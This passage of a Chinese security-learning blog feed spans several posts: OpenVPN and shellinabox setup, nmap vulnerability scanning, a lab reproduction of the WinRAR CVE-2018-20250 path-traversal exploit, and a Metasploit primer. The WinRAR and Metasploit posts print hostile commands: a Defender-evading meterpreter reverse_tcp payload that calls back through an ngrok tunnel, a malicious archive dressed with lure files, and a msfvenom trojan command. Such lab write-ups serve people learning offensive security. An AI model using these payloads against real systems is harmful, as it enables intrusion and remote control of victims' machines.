添加规则</h4><p><strong>调整防火墙（UFW）规则</strong></p><p>配置防火墙规则来引导进入服务器的一些流量，需要修改防火墙规则文件来建立伪装规则，iptables的概念用于提供动态的NAT，从而正确地路由客户端连接。在打开防火墙配置文件以添加伪装规则之前，需要找到Ubuntu服务器的公共网络接口，输入如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip route | grep default</span><br></pre></td></tr></table></figure><p>公共网络接口应当紧跟在单词”dev”后面，例如，我的接口名字为ens33：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">default via 172.18.31.253 dev ens33</span><br></pre></td></tr></table></figure><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554432573267.png" alt="1554432573267"></p><p>打开/etc/ufw/before.rules这个文件并添加相应的规则：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/ufw/before.rules</span><br></pre></td></tr></table></figure><p>在最前面填入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># START OPENVPN RULES</span><br><span class="line"># NAT table rules</span><br><span class="line">*nat</span><br><span class="line">:POSTROUTING ACCEPT [0:0] </span><br><span class="line"># Allow traffic from OpenVPN client to eth0</span><br><span class="line">-A POSTROUTING -s 10.8.0.0/8 -o ens33 -j MASQUERADE</span><br><span class="line">COMMIT</span><br><span class="line"># END OPENVPN RULES</span><br></pre></td></tr></table></figure><p>其中10.8.0.0/8为openvpn客户端获取的ip，如在server.conf里面修改，此处应替换为相应ip，ens33为ubuntu连接网络的网卡</p><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554432778966.png" alt="1554432778966"></p><p>然后告诉防火墙默认允许转发包：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/default/ufw</span><br></pre></td></tr></table></figure><p>将</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DEFAULT_FORWARD_POLICY=&quot;DROP&quot;</span><br></pre></td></tr></table></figure><p>改为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DEFAULT_FORWARD_POLICY=&quot;ACCEPT&quot;</span><br></pre></td></tr></table></figure><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554432909071.png" alt="1554432909071"></p><h4 id="3-开放端口"><a href="#3-开放端口" class="headerlink" title="3. 开放端口"></a>3. 开放端口</h4><p><strong>打开OpenVPN端口并且使变化生效</strong></p><p>调整防火墙本身，以允许流量到OpenVPN。如果在/etc/openvpn/server.conf文件中没有修改OpenVPN的端口号和协议类型，那么直接配置防火墙允许UDP流量到1194端口，如果改变了端口和协议类型，那么根据自己设置的端口和协议类型进行配置。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo ufw allow 1194/udp</span><br><span class="line">sudo ufw allow OpenSSH</span><br></pre></td></tr></table></figure><p>  从所有修改过的文件中装载配置来关闭和重启防火墙：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo ufw disable</span><br><span class="line">sudo ufw enable</span><br></pre></td></tr></table></figure><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554433320308.png" alt="1554433320308"></p><p>至此服务器端可以正确地处理OpenVPN流量了。</p><h2 id="七、启动OpenVPN服务"><a href="#七、启动OpenVPN服务" class="headerlink" title="七、启动OpenVPN服务"></a>七、启动OpenVPN服务</h2><p>在systemd单元文件的后面，可以通过指定特定的配置文件名来作为一个实例变量来开启OpenVPN服务，我们的配置文件名称为/etc/openvpn/server.conf，所以在systemd单元文件的后面添加@server来开启OpenVPN服务:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl start openvpn@server</span><br><span class="line">sudo systemctl status openvpn@server</span><br></pre></td></tr></table></figure><p>如果一切正常的话，输出应当跟如下类似:</p><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554433559377.png" alt="1554433559377"></p><p>通过<code>ifconfig</code>可以查看新增的ip为<code>inet addr:10.8.0.1</code>的<code>tun0</code>网卡</p><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554433627533.png" alt="1554433627533"></p><p>或者</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip addr show tun0</span><br></pre></td></tr></table></figure><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554433680420.png" alt="1554433680420"></p><p>如果一切运行正常，将OpenVPN设置为开机自启动：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl enable openvpn@server</span><br></pre></td></tr></table></figure><h2 id="八、客户端配置"><a href="#八、客户端配置" class="headerlink" title="八、客户端配置"></a>八、客户端配置</h2><p><strong>制作客户端配置文件</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /etc/openvpn/ca/keys</span><br><span class="line">cp /usr/share/doc/openvpn/examples/sample-config-files/client.conf .</span><br></pre></td></tr></table></figure><p>因为是一直root权限操作，所以ubuntu普通用户没有访问证书目录的权限，可赋予普通用户读取权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod -R +rx /etc/openvpn/ca/</span><br></pre></td></tr></table></figure><p>用scp等方法将keys中的客户端证书文件复制到客户端上</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ca.crt</span><br><span class="line">ta.key </span><br><span class="line">client.crt </span><br><span class="line">client.key </span><br><span class="line">client.conf</span><br></pre></td></tr></table></figure><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554434147405.png" alt="1554434147405"></p><p>打开client.conf 将<code>remote my-server-1 1194</code>中<code>my-server-1</code> <code>1194</code>替换为服务器的ip/域名，端口，并去掉前面的分号</p><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554434551477.png" alt="1554434551477"></p><p>去掉前面的分号</p><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554434461184.png" alt="1554434461184"></p><p>设置证书地址,如果自定义了客户端证书名称自行更改</p><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554434518742.png" alt="1554434518742"></p><p>删掉分号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;tls-auth ta.key 1</span><br></pre></td></tr></table></figure><p>并在下一行添加</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key-direction 1</span><br></pre></td></tr></table></figure><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554434639408.png" alt="1554434639408"></p><p>把client.conf命名为client.ovpn，然后将<strong>ca.crt ta.key client.crt client.key client.ovpn</strong>复制到客户端配置文件目录（此为windows环境下）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Program Files\OpenVPN\config</span><br></pre></td></tr></table></figure><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554434791663.png" alt="1554434791663"></p><h2 id="九、连接测试"><a href="#九、连接测试" class="headerlink" title="九、连接测试"></a>九、连接测试</h2><p>客户端可访问官网（需要FQ），或者通过第三方渠道下载安装</p><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554435021629.png" alt="1554435021629"></p><p>如图连接成功</p><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554438169932.png" alt="1554438169932"></p><p>以上就是openvpn服务的搭建过程，如有不对遗漏之处，还望斧正，谢谢。</p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OpenVPN </tag>
            
            <tag> Ubuntu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web终端之shellinabox（配合ngrok远程登陆）</title>
      <link href="/2019/03/21/Web%E7%BB%88%E7%AB%AF%E4%B9%8Bshellinabox%EF%BC%88%E9%85%8D%E5%90%88ngrok%E8%BF%9C%E7%A8%8B%E7%99%BB%E9%99%86%EF%BC%89/"/>
      <url>/2019/03/21/Web%E7%BB%88%E7%AB%AF%E4%B9%8Bshellinabox%EF%BC%88%E9%85%8D%E5%90%88ngrok%E8%BF%9C%E7%A8%8B%E7%99%BB%E9%99%86%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h2 id="一、介绍"><a href="#一、介绍" class="headerlink" title="一、介绍"></a>一、介绍</h2><p>Shellinabox 是一个基于 web 的终端模拟器，采用 C 语言编写，使用 Ajax 与后端服务通信。它实现了一个 Webserver，默认监听 4200 端口，在支持 Javascript 和 CSS 的浏览器上访问 <a href="http://host:4200" target="_blank" rel="noopener">http://host:4200</a> 即可。并且可以配置 SSL/TLS 证书，使用 https 方式加密通信。</p><h2 id="二、安装"><a href="#二、安装" class="headerlink" title="二、安装"></a>二、安装</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install shellinabox#Debian系</span><br><span class="line">yum install shellinabox#RHEL系</span><br></pre></td></tr></table></figure><h2 id="三、启动"><a href="#三、启动" class="headerlink" title="三、启动"></a>三、启动</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">shellinaboxd -h#查看帮助信息</span><br><span class="line">shellinaboxd -b -t  #运行</span><br><span class="line">-b#在后台运行</span><br><span class="line">-t#使用基于http协议的终端</span><br></pre></td></tr></table></figure><a id="more"></a><p><strong>查看端口</strong></p><p>查看进程，是否启动</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ntulp | grep shellinabox</span><br></pre></td></tr></table></figure><h2 id="四、配置"><a href="#四、配置" class="headerlink" title="四、配置"></a>四、配置</h2><h3 id="1-创建普通用户"><a href="#1-创建普通用户" class="headerlink" title="1. 创建普通用户"></a>1. 创建普通用户</h3><p>默认禁用root登陆，需要创建一个普通用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">useradd username</span><br></pre></td></tr></table></figure><h3 id="2-修改配置文件"><a href="#2-修改配置文件" class="headerlink" title="2. 修改配置文件"></a>2. 修改配置文件</h3><p>可以需修改端口，或其他配置选项</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/default/shellinabox</span><br></pre></td></tr></table></figure><h2 id="五、登陆"><a href="#五、登陆" class="headerlink" title="五、登陆"></a>五、登陆</h2><p>局域网内访问  <a href="ip:4200" target="_blank" rel="noopener">ip:4200</a></p><p>输入用户名密码即可登陆</p><h2 id="六、内网映射（可选）"><a href="#六、内网映射（可选）" class="headerlink" title="六、内网映射（可选）"></a>六、内网映射（可选）</h2><h3 id="1-使用ngrok"><a href="#1-使用ngrok" class="headerlink" title="1.使用ngrok"></a>1.使用ngrok</h3><p><strong>使用ngrok，将基于WEB的终端映射到公网</strong></p><ol><li>访问<a href="https://www.ngrok.cc/user.html" target="_blank" rel="noopener">https://www.ngrok.cc/user.html</a> 注册 登录 找到”开通隧道”；</li><li>选择  <code>香港Ngrok免费服务器</code> ,在接下来的界面中选择隧道协议 <code>http</code> ,名称<code>shellinabox</code>（可随便填），前置域名 (不冲突即可)，本地端口(IP:PORT)被转发的ip和端口（不要填127.0.0.1），用户名密码可选填</li><li>在隧道管理中可以看到刚才建立的隧道，需要关注 <code>隧道ID</code>  <code>本地端口</code> 以及<code>域名</code> ，然后去下载Ngrok客户端</li><li>下载linux客户端，./sunny clientid 隧道ID</li><li>然后等待该隧道的建立  访问域名即可</li></ol><p><strong>ngrok.cc详细使用教程：<a href="http://www.ngrok.cc/_book/" target="_blank" rel="noopener">http://www.ngrok.cc/_book/</a></strong></p><h3 id="2-使用frp"><a href="#2-使用frp" class="headerlink" title="2.使用frp"></a>2.使用frp</h3><h3 id="3-使用花生壳"><a href="#3-使用花生壳" class="headerlink" title="3.使用花生壳"></a>3.使用花生壳</h3><p>可去官网开通    <a href="https://hsk.oray.com/" target="_blank" rel="noopener">https://hsk.oray.com/</a></p>]]></content>
      
      
      <categories>
          
          <category> 工具收集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shellinabox </tag>
            
            <tag> ngrok </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nmap基础命令</title>
      <link href="/2019/03/16/nmap%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/"/>
      <url>/2019/03/16/nmap%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h2 id="一、介绍"><a href="#一、介绍" class="headerlink" title="一、介绍"></a>一、介绍</h2><p><strong>nmap (network mapper)</strong> 最早是Linux中扫描和嗅探工具，网络连接端扫描工具，主要是探测目标机器上开启的服务、安全性问题、主机存活等等</p><h2 id="二、基本功能"><a href="#二、基本功能" class="headerlink" title="二、基本功能"></a>二、基本功能</h2><ol><li>探测机器存活情况；（是否开机）</li><li>扫端口；（服务）</li><li>扫描目标机器系统类型；（OS类型：NT/Linux）</li></ol><h2 id="三、高级用法；"><a href="#三、高级用法；" class="headerlink" title="三、高级用法；"></a>三、高级用法；</h2><ol><li>扫描目标机器上的安全漏洞；</li></ol><a id="more"></a><h2 id="四、nmap安装"><a href="#四、nmap安装" class="headerlink" title="四、nmap安装"></a>四、nmap安装</h2><h2 id="五、配置环境变量"><a href="#五、配置环境变量" class="headerlink" title="五、配置环境变量"></a>五、配置环境变量</h2><h2 id="六、基本用法"><a href="#六、基本用法" class="headerlink" title="六、基本用法"></a>六、基本用法</h2><p><strong>命令行模式</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">nmap -h #帮助信息</span><br><span class="line">nmap [扫描类型] [选项] [目标]</span><br><span class="line">nmap 192.168.1.100#对单个目标进行扫描</span><br><span class="line"></span><br><span class="line">Nmap scan report for 192.168.11.1</span><br><span class="line">Host is up (0.0013s latency).</span><br><span class="line">Not shown: 999 closed ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">80/tcp open  http</span><br></pre></td></tr></table></figure><p>端口状态</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">open</span><br><span class="line">closed</span><br><span class="line">filtered #被过滤的，探测包被拦截，无法定位该端口是否开启</span><br><span class="line">unfiltered #未过滤的，探测包没有被拦截，但是nmap还是无法判断该端口是否开启</span><br><span class="line">open|filtered #开放或者被过滤</span><br><span class="line">close|filtered#关闭或者被过滤</span><br></pre></td></tr></table></figure><p>批量扫描</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.11.0/24#扫描整个网段</span><br><span class="line">nmap 192.179.1.1-200#扫描1-200之间的主机</span><br><span class="line">nmap 192.167.1.1,2,7-40</span><br><span class="line">nmap 192.168.168.1.0/24 192.10.1.3.1-200#多网段扫描</span><br></pre></td></tr></table></figure><p>文件扫描</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo 192.168.10.11 &gt; titlename</span><br><span class="line">nmap iL titlename（扫描文件）</span><br></pre></td></tr></table></figure><p>随机选择目标 nmap -iR ，例:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -PS80 -iR 0（无休止去扫描） -p80</span><br></pre></td></tr></table></figure><p>排除扫描</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.1.0/24 --exculde 192.168.1.1,255,4-10</span><br><span class="line">   --exculde 排除主机/网络</span><br><span class="line">nmap -iL scan_file(要扫的目标) --exculdefile noscan_file(不需要扫)</span><br></pre></td></tr></table></figure><h2 id="七、带有参数的扫描"><a href="#七、带有参数的扫描" class="headerlink" title="七、带有参数的扫描"></a>七、带有参数的扫描</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">-s（Scan）</span><br><span class="line">-T（TCP）</span><br><span class="line"></span><br><span class="line">nmap -sT 使用-sT实现TCP全连接扫描，扫描过程中有三次握手</span><br><span class="line">建立连接 则表明端口开放 扫描速度慢</span><br><span class="line"></span><br><span class="line">nmap -sS 192.168.1.1 使用syn的数据包去探测,如果收到ACK，则说明端口开放</span><br><span class="line">nmap -sN -p- 192.168.1.1 NULL扫描，不设置任何控制位</span><br><span class="line">-p 端口 1-1000-p-所有端口</span><br><span class="line">-p20,21,22,23,24,25</span><br><span class="line"></span><br><span class="line">nmap -sV 192.168.1.1-V 探测服务的版本</span><br><span class="line"></span><br><span class="line">将结果写入到文件中</span><br><span class="line">nmap 192.168.1.1 &gt;./result.txt</span><br><span class="line">nmap  -sV 192.168.10.5 -oX  result.html</span><br><span class="line"></span><br><span class="line">nmap -A 192.168.1.1 所有扫描结果的详细信息 全面扫描</span><br><span class="line">nmap -O 192.168.1.1 显示操作系统信息</span><br></pre></td></tr></table></figure><h2 id="八、高级用法"><a href="#八、高级用法" class="headerlink" title="八、高级用法"></a>八、高级用法</h2><p><strong>扫描安全漏洞</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">--script使用脚本探测漏洞</span><br><span class="line">nmap --script脚本名称 目标</span><br><span class="line">在nmap的安装路径中有 /script/</span><br><span class="line">在该目录中存放nmap的脚本</span><br><span class="line"></span><br><span class="line">nmap --script smb-vuln-ms17-010 192.168.11.232</span><br><span class="line">永恒之蓝</span><br><span class="line"></span><br><span class="line">nmap --script smb-check-vulns 192.168.11.232</span><br><span class="line">MS08-067（SMB）溢出漏洞</span><br><span class="line"></span><br><span class="line">nmap --script ssl-heartbleed 192.168.11.232</span><br><span class="line">探测心脏滴血漏洞</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nmap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2018-20250-WinRAR远程代码执行漏洞</title>
      <link href="/2019/03/16/CVE-2018-20250-WinRAR%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
      <url>/2019/03/16/CVE-2018-20250-WinRAR%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>WinRAR 代码执行相关的CVE 编号如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CVE-2018-20250,CVE-2018-20251, CVE-2018-20252, CVE-2018-20253</span><br></pre></td></tr></table></figure><p>这里我们复现最开始的WinRAR目录穿越漏洞（CVE-2018-20250）。</p><h2 id="二、漏洞详情"><a href="#二、漏洞详情" class="headerlink" title="二、漏洞详情"></a>二、漏洞详情</h2><h3 id="1-原理"><a href="#1-原理" class="headerlink" title="1. 原理"></a>1. 原理</h3><p>WinRAR目录穿越漏洞（CVE-2018-20250）：</p><p>​    该漏洞是由于WinRAR 所使用的一个陈旧的动态链接库UNACEV2.dll所造成的，该动态链接库在2006 年被编译，没有任何的基础保护机制(ASLR,DEP 等)。该动态链接库的作用是处理ACE 格式文件。而在解压处理过程中存在一处目录穿越漏洞,允许解压过程写入文件至开机启动项，导致代码执行。</p><a id="more"></a><p><em>漏洞细节</em>: <a href="https://research.checkpoint.com/extracting-code-execution-from-winrar/" target="_blank" rel="noopener">https://research.checkpoint.com/extracting-code-execution-from-winrar/</a></p><h3 id="2-影响版本"><a href="#2-影响版本" class="headerlink" title="2. 影响版本"></a>2. 影响版本</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">WinRAR &lt; 5.70 Beta 1</span><br><span class="line">Bandizip &lt; = 6.2.0.0</span><br><span class="line">好压(2345压缩) &lt; = 5.9.8.10907</span><br><span class="line">360压缩 &lt; = 4.0.0.1170</span><br></pre></td></tr></table></figure><h2 id="三、漏洞复现"><a href="#三、漏洞复现" class="headerlink" title="三、漏洞复现"></a>三、漏洞复现</h2><h3 id="1-准备"><a href="#1-准备" class="headerlink" title="1. 准备"></a>1. 准备</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">KaliLinux（2019.1)</span><br><span class="line">Metasploit(KaliLinux2019.1已经集成了Metasploit5)</span><br><span class="line">ngrok</span><br></pre></td></tr></table></figure><h3 id="2-下载EXP"><a href="#2-下载EXP" class="headerlink" title="2. 下载EXP"></a>2. 下载EXP</h3><p><strong>下载WinRAR远程代码执行漏洞EXP利用文件:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/WyAtu/CVE-2018-20250.git</span><br></pre></td></tr></table></figure><p><img src="/2019/03/16/CVE-2018-20250-WinRAR远程代码执行漏洞/1552705180118.png" alt="1552705180118"></p><h3 id="3-开启ngrok"><a href="#3-开启ngrok" class="headerlink" title="3. 开启ngrok"></a>3. 开启ngrok</h3><p>浏览器打开<a href="https://www.ngrok.com/" target="_blank" rel="noopener">https://www.ngrok.com/</a> 进行账号登录，开通一个免费的隧道转发代理。</p><p>按照首页的步骤建立如下连接</p><p><img src="/2019/03/16/CVE-2018-20250-WinRAR远程代码执行漏洞/343244.png" alt></p><h3 id="4-生成Payload"><a href="#4-生成Payload" class="headerlink" title="4. 生成Payload"></a>4. 生成Payload</h3><p>Metasploit生成免杀Payload 载荷(针对Windows10的defender)</p><p>使用Metasploit5自带的免杀模块生成Payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use evasion/windows/windows_defender_exe(选择msf5免杀模块)</span><br><span class="line">show info(显示模块信息)</span><br><span class="line">set filename WinRarPayloadTest.exe(设置Payload名字 )</span><br><span class="line">set payload windows/meterpreter/reverse_tcp(设置Payload类型 )</span><br><span class="line">set lhost tcp://0.tcp.ngrok.io(设置上线地址，填写Ngrok映射出去的地址即可)</span><br><span class="line">set lport 17814(设置监听端口，填写Ngrok映射出去的端口即可 )</span><br><span class="line">run(生成Payload)</span><br></pre></td></tr></table></figure><p><img src="/2019/03/16/CVE-2018-20250-WinRAR远程代码执行漏洞/sfasfe.png" alt></p><p>把Payload文件放到EXP文件夹下的根目录</p><p><img src="/2019/03/16/CVE-2018-20250-WinRAR远程代码执行漏洞/asd57h.png" alt></p><p>打开exp.py文件把“calc.exe“修改成”WinRarPayload.exe”保存</p><p><img src="/2019/03/16/CVE-2018-20250-WinRAR远程代码执行漏洞/sdasdf676.png" alt></p><p>Python运行exp.py文件自动在文件根目录下生成恶意压缩包。</p><p><img src="/2019/03/16/CVE-2018-20250-WinRAR远程代码执行漏洞/Y4HG8TCD3.png" alt></p><p>已经成功生成了恶意的压缩包，这时候可以往里面放一些引诱文件就变成了诱人的压缩包了。</p><p>Windows7靶机下载解压这个恶意压缩包：</p><p><img src="/2019/03/16/CVE-2018-20250-WinRAR远程代码执行漏洞/saass.png" alt></p><p>解压后自动在系统启动目录下自动出现我们之前生成的Payload</p><p><img src="/2019/03/16/CVE-2018-20250-WinRAR远程代码执行漏洞/dfgjhjh456754.png" alt></p><p>Windows7系统启动目录:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</span><br></pre></td></tr></table></figure><p>Metasploit启动远程监听主机上线请求:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.10.20</span><br><span class="line">set lport 8878</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="/2019/03/16/CVE-2018-20250-WinRAR远程代码执行漏洞/%$V6[`8.png" alt></p><p><img src="/2019/03/16/CVE-2018-20250-WinRAR远程代码执行漏洞/2B3X4XPAT0W.png" alt></p><p>确保ngrok后台在运行,然后重启Windows7靶机，metasploit监听等待上线</p><h3 id="5-验证payload"><a href="#5-验证payload" class="headerlink" title="5. 验证payload"></a>5. 验证payload</h3><p>待更新</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WinRAR </tag>
            
            <tag> Metasploit </tag>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Metasploit(MSF)入门</title>
      <link href="/2019/03/14/Metasploit-MSF/"/>
      <url>/2019/03/14/Metasploit-MSF/</url>
      
        <content type="html"><![CDATA[<h2 id="一、Metasploit介绍"><a href="#一、Metasploit介绍" class="headerlink" title="一、Metasploit介绍"></a>一、Metasploit介绍</h2><p>综合利用工具，集成了上千种漏洞利用方式，操作简单易上手。</p><h2 id="二、Metasploit启动"><a href="#二、Metasploit启动" class="headerlink" title="二、Metasploit启动"></a>二、Metasploit启动</h2><p>kali集成了Metasploit框架，依赖于postgresql数据库</p><ol><li><p>先启动数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/postgresql start</span><br></pre></td></tr></table></figure></li><li><p>启动MSF</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure></li></ol><h2 id="三、生成木马程序"><a href="#三、生成木马程序" class="headerlink" title="三、生成木马程序"></a>三、生成木马程序</h2><p>利用MSF生成木马获取meterpreter反弹shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.10.14 lport=8787 -f exe &gt;./demo.exe</span><br></pre></td></tr></table></figure><a id="more"></a><p>-p  选用什么payload<br>lhost  监听ip<br>lport  监听端口<br>-f  生成文件的类型</p><h2 id="四、投放木马到目标机上"><a href="#四、投放木马到目标机上" class="headerlink" title="四、投放木马到目标机上"></a>四、投放木马到目标机上</h2><h2 id="五、开启监听"><a href="#五、开启监听" class="headerlink" title="五、开启监听"></a>五、开启监听</h2><p>启用MSF，具体操作如下：</p><ol><li><p>加载expuse </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 